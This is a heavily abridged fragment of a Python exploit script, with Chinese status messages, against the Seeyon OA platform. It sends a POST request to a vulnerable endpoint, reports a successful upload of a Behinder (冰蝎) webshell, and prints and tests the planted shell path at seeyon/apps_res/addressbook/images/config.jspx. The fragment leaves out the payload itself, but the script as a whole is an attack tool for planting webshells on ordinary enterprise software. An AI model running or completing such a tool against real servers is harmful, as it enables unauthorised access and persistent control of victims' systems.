...
def main(target_url):
    ...
    #console.print(now_time() + " [INFO]     正在请求: {}".format(vuln_url_2), style='bold blue')
    headers = {
    ...
    success_msg = now_time() + '[SUCCESS]成功上传冰蝎'
    warning_msg = now_time() + '[WARNING][WARNING]  目标漏洞无法利用, 写入失败'
    error_msg = now_time() + '[][ERROR]目标请求失败'
    try:
        requests.post(url=vuln_url_2, headers=headers, data=data, verify=False)
        test_webshell(target_url)
        shell_msg = now_time() + '默认webshell: {}seeyon/apps_res/addressbook/images/config.jspx'.format(target_url, target_url)
    except:
        return error_msg 
...
def test_webshell(target_url):
    ...
    try:
        ...
        '''console.print(now_time() + " [INFO]     正在请求: {}seeyon/apps_res/addressbook/images/config.jspx".format(
            target_url), style='bold blue')'''
